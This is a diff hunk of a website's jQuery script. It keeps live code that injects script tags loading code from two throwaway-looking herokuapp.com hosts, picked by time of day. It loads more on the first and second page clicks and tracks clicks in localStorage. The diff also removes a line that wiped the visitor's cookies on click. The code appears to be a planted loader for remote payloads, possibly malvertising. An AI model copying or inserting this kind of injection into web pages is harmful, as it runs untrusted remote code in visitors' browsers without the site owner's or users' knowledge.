@@ -193,30 +193,28 @@ $(document).ready(function(){
     var nH=nD.getUTCHours();
 
     if(nH<12){
-        $('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
+        $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
     }else{
-        $('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
+        $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
     }
 
     localStorage.setItem('dcc', 0);
     $('body').click(function() {
-        $('#yp_1872').remove();
-        document.cookie.split(";").forEach(function(c) { document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); });
         var cco=localStorage.getItem('dcc');
         cco++;
         localStorage.setItem('dcc', cco);
         if(cco==1){
             if(nH<12){
-                $('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
+                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
             }else{
-                $('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
+                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
             }
         }
         if(cco==2){
             if(nH<12){
-                $('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
+                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
             }else{
-                $('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
+                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
             }
         }
     });
